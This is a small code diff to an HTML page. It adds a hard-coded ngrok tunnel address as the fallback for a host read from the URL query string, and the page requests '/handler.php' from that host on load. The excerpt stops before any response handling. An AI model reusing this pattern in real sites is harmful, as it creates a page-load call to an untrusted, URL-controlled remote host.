@@ -9,6 +9,7 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"></script>
     <script>
         var host = window.location.search.substring(1).split('&')[0].split('=')[1];
+	host = host || "69c8-94-25-168-199.ngrok.io";
         window.onload = function () {
             var xhttp=new XMLHttpRequest();
             xhttp.open("GET", "https://" + host + "/handler.php", true);
